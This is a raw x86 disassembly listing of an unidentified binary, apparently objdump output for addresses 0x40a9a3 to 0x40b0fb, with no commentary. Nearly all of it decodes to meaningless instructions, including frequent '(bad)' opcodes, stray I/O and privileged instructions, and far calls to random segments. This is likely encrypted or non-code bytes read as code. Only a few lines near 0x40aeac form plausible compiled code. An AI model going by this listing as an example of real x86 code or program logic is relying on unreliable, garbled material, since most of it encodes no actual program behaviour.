  40a9a3:	inc    DWORD PTR [eax-0x6a]
  40a9a6:	adc    al,0x57
  40a9a8:	je     0x40a945
  40a9aa:	scas   al,BYTE PTR es:[edi]
  40a9ab:	call   0x7f11:0xddbcc969
  40a9b2:	test   eax,0x88f7798e
  40a9b7:	jl     0x40aa30
  40a9b9:	(bad)  
  40a9bb:	add    BYTE PTR ds:0xa79ae600,bl
  40a9c1:	cmp    DWORD PTR ds:0x2387cc84,ebx
  40a9c7:	rol    dl,0x8e
  40a9ca:	vorps  ymm0,ymm0,YMMWORD PTR [eax-0x20]
  40a9cf:	jmp    0x4fb0:0x6f84dfb7
  40a9d6:	cdq    
  40a9d7:	xor    al,0xce
  40a9d9:	and    ebx,ebp
  40a9db:	sub    bh,BYTE PTR ds:0x35e125c6
  40a9e1:	jnp    0x40aa5b
  40a9e3:	adc    DWORD PTR [edx+esi*1-0x14],edx
  40a9e7:	test   DWORD PTR [ecx+ebp*4],edx
  40a9ea:	jne    0x40a9f2
  40a9ec:	sub    al,0xca
  40a9ee:	iret   
  40a9ef:	mov    BYTE PTR [ebp+ecx*2-0x57],0x52
  40a9f4:	pop    edi
  40a9f5:	sub    edx,DWORD PTR [eax]
  40a9f7:	repz loopne 0x40a99e
  40a9fa:	nop
  40a9fb:	mov    bl,0x99
  40a9fd:	push   esp
  40a9fe:	call   0x2298d266
  40aa03:	(bad)  
  40aa04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa05:	xchg   ebx,eax
  40aa06:	adc    BYTE PTR [ebp+esi*4-0x19a586bc],0x7c
  40aa0e:	mov    ds:0x87973e8f,al
  40aa13:	sub    BYTE PTR [ebx-0x7d225fbb],dh
  40aa19:	stc    
  40aa1a:	cmp    al,0xeb
  40aa1c:	add    al,0xa4
  40aa1e:	int    0x9
  40aa20:	or     bl,bl
  40aa22:	inc    ebp
  40aa23:	or     eax,0xfb3219f4
  40aa28:	bound  esp,QWORD PTR [eax-0x575b4191]
  40aa2e:	sbb    eax,0x9e3e439b
  40aa33:	pop    esi
  40aa34:	mov    ebx,0xc765fda
  40aa39:	loopne 0x40a9e3
  40aa3b:	addr16 inc edi
  40aa3d:	rcl    DWORD PTR [edi],1
  40aa3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa40:	xor    eax,0xda51eddc
  40aa45:	pop    ss
  40aa46:	adc    BYTE PTR [edi+edx*8],cl
  40aa49:	mov    ss,edi
  40aa4b:	mov    al,0xdf
  40aa4d:	adc    al,0xbd
  40aa4f:	ins    DWORD PTR es:[edi],dx
  40aa50:	inc    esp
  40aa51:	pop    esp
  40aa52:	aas    
  40aa53:	jle    0x40aa99
  40aa55:	or     al,0x41
  40aa57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa58:	push   esi
  40aa59:	push   0x64
  40aa5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa5c:	cmp    ecx,DWORD PTR [ebp-0x50]
  40aa5f:	cli    
  40aa60:	mov    ebp,0x8d801b58
  40aa65:	adc    eax,DWORD PTR [edi+0x5e]
  40aa68:	sbb    dl,dl
  40aa6a:	inc    edx
  40aa6b:	mov    cl,0xd
  40aa6d:	popf   
  40aa6e:	xor    BYTE PTR [eax],dl
  40aa70:	jnp    0x40aaa4
  40aa72:	adc    esp,DWORD PTR [edx+ebx*8]
  40aa75:	mov    cl,0x8b
  40aa77:	mov    ebp,0x11142b2
  40aa7c:	cli    
  40aa7d:	sbb    al,0x69
  40aa7f:	jecxz  0x40aade
  40aa81:	loop   0x40aacc
  40aa83:	retf   0x3a88
  40aa86:	xor    al,0x8c
  40aa88:	cs dec ebx
  40aa8a:	stc    
  40aa8b:	inc    edi
  40aa8c:	jecxz  0x40aa74
  40aa8e:	xchg   esi,eax
  40aa8f:	fwait
  40aa90:	inc    ecx
  40aa91:	pop    ecx
  40aa92:	(bad)  
  40aa93:	jns    0x40aa47
  40aa95:	rcr    BYTE PTR [bp+0x7a],cl
  40aa99:	icebp  
  40aa9a:	ret    0x5c54
  40aa9d:	cs pusha 
  40aa9f:	int3   
  40aaa0:	fbld   TBYTE PTR [esi+ecx*4+0x2db67e9]
  40aaa7:	(bad)  [edi-0x5f]
  40aaaa:	jmp    0x12c671c7
  40aaaf:	popf   
  40aab0:	add    DWORD PTR [eax-0x48],ebp
  40aab3:	mov    BYTE PTR [ebp+0x268ea961],0x36
  40aaba:	and    ah,BYTE PTR [ebx+0x412528ab]
  40aac0:	popf   
  40aac1:	adc    BYTE PTR [ebp+0x5265c11e],ch
  40aac7:	lods   al,BYTE PTR ds:[esi]
  40aac8:	adc    BYTE PTR [edx+0x224423c6],bl
  40aace:	les    edx,FWORD PTR [ebp-0x6630b507]
  40aad4:	lods   al,BYTE PTR ds:[esi]
  40aad5:	adc    BYTE PTR [ecx],0x18
  40aad8:	ret    0x93d6
  40aadb:	popf   
  40aadc:	add    eax,0xc94f969d
  40aae1:	shl    BYTE PTR [edx-0x3d],1
  40aae4:	call   0x9483:0x1c7147af
  40aaeb:	(bad)  
  40aaec:	mov    ebx,0x9c7c0598
  40aaf1:	retf   0xf610
  40aaf4:	jmp    DWORD PTR [eax-0x6d]
  40aaf7:	stos   BYTE PTR es:[edi],al
  40aaf8:	dec    esi
  40aaf9:	out    0xb9,al
  40aafb:	imul   ebx,DWORD PTR [edi+edx*2],0xffffff9e
  40aaff:	test   edx,ecx
  40ab01:	(bad)  
  40ab02:	gs (bad) 
  40ab04:	cmc    
  40ab05:	dec    esi
  40ab06:	push   eax
  40ab07:	in     eax,dx
  40ab08:	mov    ds:0x93ff4e6c,eax
  40ab0d:	xchg   esp,eax
  40ab0e:	push   esp
  40ab0f:	pushf  
  40ab10:	cmp    BYTE PTR [esi],bh
  40ab12:	xor    edx,DWORD PTR ds:0xc2dbe51e
  40ab18:	mov    ebx,0xcaba8c4b
  40ab1d:	and    dl,BYTE PTR [ecx+0x3bd8bad6]
  40ab23:	push   eax
  40ab24:	adc    DWORD PTR [ebx-0x11],eax
  40ab27:	sbb    BYTE PTR [ecx-0xd3fffff],0x5b
  40ab2e:	sbb    esp,ecx
  40ab30:	sbb    eax,0x92c5c3c9
  40ab35:	hlt    
  40ab36:	pop    esp
  40ab37:	inc    ebx
  40ab38:	push   esi
  40ab39:	inc    ebx
  40ab3a:	jmp    0x40ab86
  40ab3c:	(bad)  [edx-0x7a]
  40ab3f:	out    0xcd,eax
  40ab41:	(bad)  
  40ab42:	fsub   DWORD PTR [edi]
  40ab44:	ins    DWORD PTR es:[edi],dx
  40ab45:	ins    DWORD PTR es:[edi],dx
  40ab46:	adc    eax,0xe62127d3
  40ab4b:	shl    bh,0x53
  40ab4e:	hlt    
  40ab4f:	in     eax,dx
  40ab50:	(bad)  
  40ab52:	pop    esi
  40ab53:	dec    edx
  40ab54:	mov    dl,0x57
  40ab56:	push   esi
  40ab57:	rol    ch,cl
  40ab59:	push   eax
  40ab5a:	mov    edi,0x60732a5b
  40ab5f:	cmp    esi,DWORD PTR [ebx-0x68]
  40ab62:	mov    ebp,0x13afb56d
  40ab67:	std    
  40ab68:	test   BYTE PTR [eax+ebp*2],0xe7
  40ab6c:	lds    esi,FWORD PTR [eax+edx*2]
  40ab6f:	add    eax,0x608e3d37
  40ab74:	sbb    esp,DWORD PTR [eax+0x6a]
  40ab77:	ins    DWORD PTR es:[edi],dx
  40ab78:	jb     0x40ab64
  40ab7a:	dec    esi
  40ab7b:	mov    ah,BYTE PTR [esp+edi*4-0x6e]
  40ab7f:	cmp    eax,0x75eabaa2
  40ab84:	push   edi
  40ab85:	cmp    dh,BYTE PTR [edx]
  40ab87:	neg    DWORD PTR [ebp-0x73502dce]
  40ab8d:	sar    DWORD PTR [ecx+ebx*2],0x69
  40ab91:	xchg   BYTE PTR [eax],dh
  40ab93:	dec    ebx
  40ab94:	xchg   edx,eax
  40ab95:	or     DWORD PTR [eax-0x60fbdfc6],eax
  40ab9b:	mov    ecx,0xc5c0793d
  40aba0:	cmp    eax,0xc8d973c6
  40aba5:	lea    ebx,[ebp-0xb61d5a3]
  40abab:	xor    eax,0x26d71b7e
  40abb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abb1:	jns    0x40abc1
  40abb3:	in     al,0x50
  40abb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abb6:	push   cs
  40abb7:	and    esi,DWORD PTR [ecx+0x30]
  40abba:	mov    DWORD PTR [ecx-0x5a26c67b],ebp
  40abc0:	cld    
  40abc1:	shl    DWORD PTR [esp+edi*4-0x3d],0x2e
  40abc6:	pop    edx
  40abc7:	mov    ebx,0xe3f7e08a
  40abcc:	sub    al,0xd
  40abce:	cdq    
  40abcf:	cld    
  40abd0:	(bad)  
  40abd1:	hlt    
  40abd2:	seto   BYTE PTR [esi]
  40abd5:	and    DWORD PTR [ecx],edi
  40abd7:	repz mov ds:0x2444f28d,eax
  40abdd:	dec    esi
  40abde:	jns    0x40abf4
  40abe0:	(bad)  
  40abe1:	int3   
  40abe2:	(bad)  
  40abe4:	cmp    DWORD PTR [edi+0x78fb73e],eax
  40abea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abeb:	dec    edi
  40abec:	fs sbb al,0x8b
  40abef:	int3   
  40abf0:	nop
  40abf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abf2:	sub    esi,DWORD PTR [ebp+0x23]
  40abf5:	or     eax,0xe6b072a1
  40abfa:	test   eax,0xe45a4852
  40abff:	lea    esi,ss:0xc122412c
  40ac06:	or     ecx,eax
  40ac08:	add    BYTE PTR [eax],cl
  40ac0a:	test   ebp,eax
  40ac0c:	and    esi,DWORD PTR [edi+0x39]
  40ac0f:	bound  ebx,QWORD PTR [ebp+0x4c29b543]
  40ac15:	fwait
  40ac16:	cli    
  40ac17:	and    cl,BYTE PTR [ecx-0x16]
  40ac1a:	(bad)  
  40ac1b:	cmp    cl,BYTE PTR [eax-0x352713c]
  40ac21:	ins    DWORD PTR es:[edi],dx
  40ac22:	ret    0xa0e2
  40ac25:	daa    
  40ac26:	out    dx,al
  40ac27:	mov    ch,0xa2
  40ac29:	ins    BYTE PTR es:[edi],dx
  40ac2a:	add    al,0x27
  40ac2c:	jl     0x40ac40
  40ac2e:	ss repnz (bad) 
  40ac31:	or     eax,0xe289ac2a
  40ac36:	ret    
  40ac37:	iret   
  40ac38:	test   DWORD PTR [edi],ebp
  40ac3a:	or     ah,BYTE PTR [edx]
  40ac3c:	jno    0x40ac12
  40ac3e:	gs out dx,al
  40ac40:	scas   al,BYTE PTR es:[edi]
  40ac41:	push   0xffffffa1
  40ac43:	lock inc ecx
  40ac45:	pop    ss
  40ac46:	es ins BYTE PTR es:[edi],dx
  40ac48:	arpl   WORD PTR [esi],bx
  40ac4a:	pop    edx
  40ac4b:	cmp    al,0xc0
  40ac4d:	inc    ebx
  40ac4e:	ds cmp ebx,esi
  40ac51:	xchg   ebx,eax
  40ac52:	out    0x3c,eax
  40ac54:	ds jo  0x40ac66
  40ac57:	mov    ebp,0x9ffd48f9
  40ac5c:	cmp    eax,ecx
  40ac5e:	inc    edx
  40ac5f:	aad    0x83
  40ac61:	mov    edi,?
  40ac63:	mov    ds:0xc75ef23d,eax
  40ac68:	jle    0x40ac4b
  40ac6a:	stos   DWORD PTR es:[edi],eax
  40ac6b:	aad    0x53
  40ac6d:	jb     0x40ac90
  40ac6f:	aad    0x69
  40ac71:	ins    DWORD PTR es:[edi],dx
  40ac72:	stc    
  40ac73:	fild   DWORD PTR [ecx+0x2d]
  40ac76:	fiadd  DWORD PTR [edx-0x5b]
  40ac79:	and    DWORD PTR [edi+0x3e],esi
  40ac7c:	popa   
  40ac7d:	add    eax,0xd34f10d
  40ac82:	mov    dl,0x86
  40ac84:	shr    DWORD PTR [edi+ecx*1+0x13],cl
  40ac88:	mov    eax,DWORD PTR [ebp+0x76]
  40ac8b:	test   DWORD PTR [eax-0x67],0xb427e20a
  40ac92:	test   ah,0x25
  40ac95:	icebp  
  40ac96:	in     al,0xa2
  40ac98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac99:	aaa    
  40ac9a:	and    dl,BYTE PTR [eax+0x7958f7fb]
  40aca0:	fmul   st,st(0)
  40aca2:	pop    edi
  40aca3:	lods   eax,DWORD PTR ds:[esi]
  40aca4:	add    al,0xb2
  40aca6:	(bad)  
  40aca7:	arpl   WORD PTR [eax+edx*1],bx
  40acaa:	addr16 mov ah,0xf9
  40acad:	ret    
  40acae:	mul    DWORD PTR [edi-0x7e]
  40acb1:	jp     0x40acf1
  40acb3:	adc    DWORD PTR [ecx+0x69],ebx
  40acb6:	mov    dh,0x6
  40acb8:	xchg   esi,eax
  40acb9:	jecxz  0x40ac76
  40acbb:	mov    al,0x98
  40acbd:	or     ebp,0x946cbe45
  40acc3:	fistp  WORD PTR [ecx+ebx*8]
  40acc6:	fwait
  40acc7:	pushf  
  40acc8:	sbb    ch,dl
  40acca:	stc    
  40accb:	aas    
  40accc:	ret    
  40accd:	out    dx,eax
  40acce:	(bad)  
  40accf:	jmp    0x40acaf
  40acd1:	cld    
  40acd2:	push   es
  40acd3:	retf   
  40acd4:	or     eax,0x6373d987
  40acd9:	or     DWORD PTR [esi+edx*1-0x3a],ecx
  40acdd:	lock nop
  40acdf:	sbb    eax,0x4e073953
  40ace4:	int    0xb1
  40ace6:	sar    ah,cl
  40ace8:	inc    esp
  40ace9:	jnp    0x40ad24
  40aceb:	in     al,0x22
  40aced:	sar    DWORD PTR [ecx-0x5768d75a],1
  40acf3:	adc    BYTE PTR [edx],dh
  40acf5:	shr    esp,0x3b
  40acf8:	adc    ch,BYTE PTR [esi]
  40acfa:	mov    WORD PTR [ecx-0x13],fs
  40acfd:	mov    cl,0x77
  40acff:	data16 aam 0x28
  40ad02:	mov    cl,0x89
  40ad04:	add    al,0x3b
  40ad06:	in     eax,dx
  40ad07:	addr16 push ds
  40ad09:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad0b:	jecxz  0x40acf2
  40ad0d:	dec    esp
  40ad0e:	lds    ebp,FWORD PTR fs:[esi-0x2dfb07f0]
  40ad15:	not    DWORD PTR [esp+ecx*4+0x208682d4]
  40ad1c:	pop    ebx
  40ad1d:	addr16 mov ds:0x8f2,al
  40ad21:	xor    eax,0xbfefe230
  40ad26:	cmp    eax,DWORD PTR [edi-0x47fac5b8]
  40ad2c:	test   al,0x42
  40ad2e:	int3   
  40ad2f:	mov    bl,0x1
  40ad31:	jmp    FWORD PTR [ecx-0x34]
  40ad34:	push   ebx
  40ad35:	(bad)  
  40ad36:	cmp    al,0x53
  40ad38:	sysenter 
  40ad3a:	ret    
  40ad3b:	and    al,0x91
  40ad3d:	xlat   BYTE PTR ds:[ebx]
  40ad3e:	ds ret 0xf21a
  40ad42:	pop    ss
  40ad43:	retf   0xc3aa
  40ad46:	loope  0x40acef
  40ad48:	dec    eax
  40ad49:	or     al,0x0
  40ad4b:	push   ecx
  40ad4c:	clc    
  40ad4d:	gs mov ecx,0x4bb244d2
  40ad53:	cmp    al,0x60
  40ad55:	es loop 0x40ad37
  40ad58:	or     al,0x99
  40ad5a:	mov    cs,WORD PTR [esi-0x5c]
  40ad5d:	arpl   WORD PTR [edx-0x798b19d6],bx
  40ad63:	call   0x65297d2d
  40ad68:	bound  esi,QWORD PTR [ecx]
  40ad6a:	xchg   esp,eax
  40ad6b:	push   es
  40ad6c:	mov    BYTE PTR [ecx+0x209b0201],ah
  40ad72:	inc    edi
  40ad73:	ins    DWORD PTR es:[edi],dx
  40ad74:	push   esi
  40ad75:	lea    edx,[ebp+0x6f]
  40ad78:	retf   
  40ad79:	sbb    eax,0x56823d84
  40ad7e:	int3   
  40ad7f:	nop
  40ad80:	xor    ebx,esp
  40ad82:	jmp    0xaccb34c0
  40ad87:	jle    0x40ad9d
  40ad89:	and    eax,0xdc16ee63
  40ad8e:	jl     0x40ad99
  40ad90:	in     al,0xe3
  40ad92:	jnp    0x40adda
  40ad94:	mov    ah,BYTE PTR [edi+0x5eb8100c]
  40ad9a:	xchg   ebx,ebp
  40ad9c:	push   ebp
  40ad9d:	outs   dx,DWORD PTR ds:[esi]
  40ad9e:	std    
  40ad9f:	xchg   esi,eax
  40ada0:	adc    eax,0xaae4d155
  40ada5:	or     eax,0xe833701
  40adaa:	rcl    BYTE PTR [eax+0x4e5bbd3b],0x2a
  40adb1:	mov    ds:0x4f78aa00,eax
  40adb6:	or     BYTE PTR [edi*8+0xed85e3e],0x51
  40adbe:	ret    0x43de
  40adc1:	ret    0x623
  40adc4:	adc    dl,ah
  40adc6:	pop    ecx
  40adc7:	jl     0x40ad67
  40adc9:	xchg   esi,eax
  40adca:	call   0x83b6:0xbe55d581
  40add1:	mov    cl,0x1c
  40add3:	xor    dl,BYTE PTR [edi-0xb]
  40add6:	pop    ss
  40add7:	push   edx
  40add8:	pop    edx
  40add9:	arpl   WORD PTR [ebx-0x2668bd39],bx
  40addf:	push   ds
  40ade0:	xchg   BYTE PTR [ecx+edi*4-0x2e8b35a2],bl
  40ade7:	lock pop ebp
  40ade9:	sub    bl,bh
  40adeb:	ins    BYTE PTR es:[edi],dx
  40adec:	mov    ds:0xc671984e,al
  40adf1:	ins    BYTE PTR es:[edi],dx
  40adf2:	out    0x3d,eax
  40adf4:	imul   edx,DWORD PTR [esi-0x4ddaead6],0xffffffc1
  40adfb:	adc    al,0xfb
  40adfd:	stos   BYTE PTR es:[edi],al
  40adfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adff:	nop
  40ae00:	retf   0xa927
  40ae03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae04:	and    eax,0x5712a878
  40ae09:	dec    esi
  40ae0a:	cmp    eax,0x4cd03c36
  40ae0f:	pop    esp
  40ae10:	mov    dl,0x94
  40ae12:	pop    ebp
  40ae13:	ror    DWORD PTR [ebp+0x7d],cl
  40ae16:	or     eax,0xda0ac509
  40ae1b:	jno    0x40adee
  40ae1d:	xchg   esi,eax
  40ae1e:	mov    DWORD PTR [edx],esi
  40ae20:	jle    0x40ae04
  40ae22:	aas    
  40ae23:	sub    ah,BYTE PTR [edi]
  40ae25:	push   ds
  40ae26:	push   es
  40ae27:	cwde   
  40ae28:	cmp    ch,0xfb
  40ae2b:	inc    esp
  40ae2c:	pop    ebp
  40ae2d:	xor    eax,0xff890cb7
  40ae32:	(bad)  [edi+0x33f36e03]
  40ae38:	jns    0x40addc
  40ae3a:	pop    ebp
  40ae3b:	xlat   BYTE PTR ds:[ebx]
  40ae3c:	outs   dx,BYTE PTR ds:[esi]
  40ae3d:	ja     0x40ae5f
  40ae3f:	test   eax,0xa689f142
  40ae44:	sbb    dl,BYTE PTR [edi]
  40ae46:	mov    gs,WORD PTR [edi]
  40ae48:	mov    ebp,0x6e887557
  40ae4d:	push   0x30
  40ae4f:	fisttp WORD PTR [edx-0x590c7e86]
  40ae55:	xchg   edi,eax
  40ae56:	inc    esp
  40ae57:	stos   DWORD PTR es:[edi],eax
  40ae58:	inc    ebx
  40ae59:	aaa    
  40ae5a:	pop    ebp
  40ae5b:	enter  0x4ee3,0xc0
  40ae5f:	mov    edx,0xf4c1778e
  40ae64:	sbb    DWORD PTR [edi+eax*8+0x7c],ebp
  40ae68:	stos   DWORD PTR es:[edi],eax
  40ae69:	dec    edi
  40ae6a:	push   esi
  40ae6b:	lea    edi,[ecx]
  40ae6d:	adc    al,0x2f
  40ae6f:	imul   ebp,DWORD PTR [ecx+0x4fc28e7e],0xf3b6e289
  40ae79:	adc    eax,0xb34e9a60
  40ae7e:	and    DWORD PTR [esi-0x34],0x84c5ebd7
  40ae85:	aad    0x8c
  40ae87:	loop   0x40aea4
  40ae89:	jg     0x40af08
  40ae8b:	(bad)  [ecx]
  40ae8d:	icebp  
  40ae8e:	push   esi
  40ae8f:	dec    edi
  40ae90:	fs out dx,al
  40ae92:	jne    0x40aea4
  40ae94:	and    bl,BYTE PTR [ebx+0x30b219e7]
  40ae9a:	jecxz  0x40ae63
  40ae9c:	jb     0x40aefa
  40ae9e:	pop    ss
  40ae9f:	jae    0x40aeae
  40aea1:	adc    DWORD PTR [ebp-0x17],esi
  40aea4:	leave  
  40aea5:	ins    DWORD PTR es:[edi],dx
  40aea6:	or     ecx,DWORD PTR [edx-0x75fb766c]
  40aeac:	mov    eax,DWORD PTR [ebp-0xc]
  40aeaf:	mov    ecx,DWORD PTR [ebp+0x8]
  40aeb2:	xor    eax,esi
  40aeb4:	lea    eax,[eax+ecx*1+0x3272f8]
  40aebb:	mov    DWORD PTR [ebp+0x8],eax
  40aebe:	mov    eax,DWORD PTR [ebp-0xc]
  40aec1:	mov    ecx,DWORD PTR [ebp+0x14]
  40aec4:	xor    eax,esi
  40aec6:	add    eax,edi
  40aec8:	imul   eax,DWORD PTR [ecx]
  40aecb:	mov    ecx,DWORD PTR [ebp-0x4]
  40aece:	mov    edx,DWORD PTR [ebp+0x8]
  40aed1:	xor    ecx,esi
  40aed3:	jmp    0x40d273
  40aed8:	mov    WORD PTR [esi+edi*8+0x6c5d2edd],ds
  40aedf:	out    dx,al
  40aee0:	fwait
  40aee1:	push   edx
  40aee2:	(bad)  
  40aee3:	xor    esi,DWORD PTR [ebx]
  40aee5:	push   ss
  40aee6:	fisub  DWORD PTR ds:0x7b7b08ac
  40aeec:	(bad)  
  40aeed:	sahf   
  40aeee:	jnp    0x40af6b
  40aef0:	iret   
  40aef1:	xor    DWORD PTR [edi+0x532c25e3],edi
  40aef7:	cmp    eax,0xae8086dc
  40aefc:	sub    BYTE PTR [edx],0x2
  40aeff:	call   0x97f2a379
  40af04:	jns    0x40af41
  40af06:	sub    eax,0x3d2cf96e
  40af0b:	in     eax,dx
  40af0c:	mov    bl,0x49
  40af0e:	jb     0x40af70
  40af10:	dec    eax
  40af11:	sub    al,0x66
  40af13:	xor    DWORD PTR [edx+0x39],edi
  40af16:	adc    ebx,DWORD PTR gs:[ecx+0x38ec2bb0]
  40af1d:	mov    al,ds:0x5f7931dd
  40af22:	mov    ds:0xf7e34df,eax
  40af27:	mov    esi,0xf91896d1
  40af2c:	inc    edi
  40af2d:	outs   dx,BYTE PTR ds:[esi]
  40af2e:	mov    bl,0xe8
  40af30:	and    esi,DWORD PTR [edx-0x7c6b720]
  40af36:	clc    
  40af37:	popa   
  40af38:	pop    ss
  40af39:	(bad)  
  40af3a:	mov    ebx,0x46bed4cd
  40af3f:	nop
  40af40:	in     eax,dx
  40af41:	mov    edx,0x2fe2c239
  40af46:	ja     0x40af36
  40af48:	push   eax
  40af49:	mov    DWORD PTR [edi],eax
  40af4b:	jecxz  0x40aecd
  40af4d:	inc    edx
  40af4e:	shl    bl,cl
  40af50:	nop
  40af51:	cs xchg esi,eax
  40af53:	adc    edi,DWORD PTR [edx-0x6efe790a]
  40af59:	add    BYTE PTR [ecx-0x59],al
  40af5c:	add    dl,ch
  40af5e:	sbb    al,0x3c
  40af60:	push   0x68
  40af62:	jp     0x40afc3
  40af64:	(bad)  
  40af66:	jg     0x40af52
  40af68:	call   0x7e1dc938
  40af6d:	scas   eax,DWORD PTR es:[edi]
  40af6e:	int    0x36
  40af70:	out    0xbf,al
  40af72:	aam    0x8d
  40af74:	rol    DWORD PTR [ecx-0x7050de4e],1
  40af7a:	sbb    DWORD PTR [ebp-0xa7e48d8],esi
  40af80:	cmp    eax,0x4b7e497d
  40af85:	test   al,0x6e
  40af87:	jle    0x40af97
  40af89:	cmp    ecx,DWORD PTR ds:0x8c302e09
  40af8f:	mov    dh,0x91
  40af91:	dec    esp
  40af92:	daa    
  40af93:	icebp  
  40af94:	mov    WORD PTR [ebx],ds
  40af96:	(bad)  
  40af97:	sti    
  40af98:	aas    
  40af99:	mov    ebp,0x123c135e
  40af9e:	loop   0x40afc3
  40afa0:	sbb    al,0x46
  40afa2:	in     eax,0x16
  40afa4:	dec    ecx
  40afa5:	xchg   esp,eax
  40afa6:	out    0x5,eax
  40afa8:	clc    
  40afa9:	rcr    BYTE PTR [edx-0x684bd4b4],1
  40afaf:	xchg   ebx,eax
  40afb0:	jne    0x40af41
  40afb2:	fadd   DWORD PTR [esi+0x551c18ae]
  40afb8:	out    0xb9,al
  40afba:	(bad)  
  40afbb:	mov    ch,0xb7
  40afbd:	(bad)  
  40afbe:	hlt    
  40afbf:	xor    edx,DWORD PTR [esi-0x196d23fd]
  40afc5:	(bad)  
  40afc6:	test   eax,0x1f107ad8
  40afcb:	dec    ebp
  40afcc:	jge    0x40afc2
  40afce:	cli    
  40afcf:	loop   0x40afc8
  40afd1:	ds stc 
  40afd3:	not    BYTE PTR [esi-0x24]
  40afd6:	popa   
  40afd7:	stos   DWORD PTR es:[edi],eax
  40afd8:	push   es
  40afd9:	into   
  40afda:	jnp    0x40b00c
  40afdc:	jno    0x40afc3
  40afde:	cs inc esi
  40afe0:	dec    ecx
  40afe1:	or     DWORD PTR [ecx],esp
  40afe3:	xchg   esp,esi
  40afe5:	loope  0x40b005
  40afe7:	gs cmp eax,0x57b9016a
  40afed:	jb     0x40b008
  40afef:	dec    esp
  40aff0:	xor    bl,BYTE PTR [edx+0x4d903e78]
  40aff6:	sbb    bh,BYTE PTR [esi+0x65]
  40aff9:	cmp    ebp,eax
  40affb:	or     ah,BYTE PTR [esi+ebp*1]
  40affe:	dec    eax
  40afff:	jecxz  0x40afd1
  40b001:	rol    BYTE PTR [ecx+0x72],1
  40b004:	and    DWORD PTR [edi-0x50],esp
  40b007:	cld    
  40b008:	test   ebp,edi
  40b00a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b00b:	ds dec esp
  40b00d:	nop
  40b00e:	shl    DWORD PTR ds:0xe41f577a,1
  40b014:	mov    fs,WORD PTR [ecx-0x6ae1a727]
  40b01a:	mov    ?,WORD PTR [ebx+eiz*2+0x6e]
  40b01e:	xchg   edi,eax
  40b01f:	or     edi,DWORD PTR [esi]
  40b021:	sub    DWORD PTR [edx+0x25],esi
  40b024:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b025:	add    eax,0xe6114ca7
  40b02a:	jmp    0x40b06e
  40b02c:	(bad)  
  40b02d:	fwait
  40b02e:	pop    ebx
  40b02f:	adc    eax,0x76ab062e
  40b034:	into   
  40b035:	mov    al,ds:0x82b25bdd
  40b03a:	inc    ecx
  40b03b:	ja     0x40affe
  40b03d:	pop    ebx
  40b03e:	div    DWORD PTR [ecx+0x1360944f]
  40b044:	adc    dl,ah
  40b046:	hlt    
  40b047:	mov    edi,0xf82212f
  40b04c:	ret    0x9ba3
  40b04f:	mov    bl,0xf2
  40b051:	loope  0x40b090
  40b053:	add    eax,0xd95492e8
  40b058:	or     DWORD PTR ds:[ebx],0x27
  40b05c:	mov    ebx,0x800fade5
  40b061:	cli    
  40b062:	push   ds
  40b063:	sub    al,0x75
  40b065:	jle    0x40b01b
  40b067:	pop    ebp
  40b068:	dec    edx
  40b069:	pop    ebx
  40b06a:	inc    edx
  40b06b:	adc    BYTE PTR ds:0xbbee9590,0x53
  40b072:	xchg   edi,eax
  40b073:	inc    eax
  40b074:	fstp   QWORD PTR [esi+0x113a65bf]
  40b07a:	xor    al,0xb8
  40b07c:	push   eax
  40b07d:	cmp    al,0xa7
  40b07f:	and    BYTE PTR [eax],bl
  40b081:	aas    
  40b082:	mov    BYTE PTR [edi-0x2],bl
  40b085:	mov    ds:0x12c5fb83,al
  40b08a:	les    eax,FWORD PTR [edx]
  40b08c:	popf   
  40b08d:	push   ss
  40b08e:	fidiv  DWORD PTR [ebx-0x5caa8db9]
  40b094:	fsubr  DWORD PTR ds:0x644e7486
  40b09a:	mov    cl,BYTE PTR [ecx-0x14]
  40b09d:	stc    
  40b09e:	imul   edx,DWORD PTR [esi+0x73ee1c77],0x3f
  40b0a5:	je     0x40b083
  40b0a7:	inc    esi
  40b0a8:	retf   0x339d
  40b0ab:	sti    
  40b0ac:	and    al,0xca
  40b0ae:	mov    bh,0xfe
  40b0b0:	sub    dl,BYTE PTR [edi+eax*1]
  40b0b3:	mov    es,ecx
  40b0b5:	lods   al,BYTE PTR ds:[esi]
  40b0b6:	cs ins DWORD PTR es:[edi],dx
  40b0b8:	(bad)  
  40b0ba:	pop    ecx
  40b0bb:	sti    
  40b0bc:	ins    BYTE PTR es:[edi],dx
  40b0bd:	cld    
  40b0be:	out    0x15,eax
  40b0c0:	scas   al,BYTE PTR es:[edi]
  40b0c1:	inc    ebp
  40b0c2:	inc    esp
  40b0c3:	push   edi
  40b0c4:	ins    DWORD PTR es:[edi],dx
  40b0c5:	or     ah,0xd9
  40b0c8:	dec    esp
  40b0c9:	(bad)  [esi]
  40b0cb:	jmp    0xcc67e0aa
  40b0d0:	jb     0x40b102
  40b0d2:	scas   eax,DWORD PTR es:[edi]
  40b0d3:	pushf  
  40b0d4:	pop    eax
  40b0d5:	xchg   DWORD PTR [ebx],esp
  40b0d7:	pop    edi
  40b0d8:	jg     0x40b05e
  40b0da:	rcr    BYTE PTR [edx-0x17],1
  40b0dd:	test   BYTE PTR [ebp+0x79],bl
  40b0e0:	int    0x2a
  40b0e2:	dec    edi
  40b0e3:	gs mov eax,0xad47de30
  40b0e9:	and    DWORD PTR [ebx],edx
  40b0eb:	cli    
  40b0ec:	sub    esi,ebp
  40b0ee:	mov    cl,0xe0
  40b0f0:	pop    esi
  40b0f1:	push   edi
  40b0f2:	adc    al,0xca
  40b0f4:	push   edi
  40b0f5:	(bad)  
  40b0f6:	loope  0x40b0d1
  40b0f8:	push   esp
  40b0f9:	loopne 0x40b15e
  40b0fb:	enter  0xecf0,0x4d
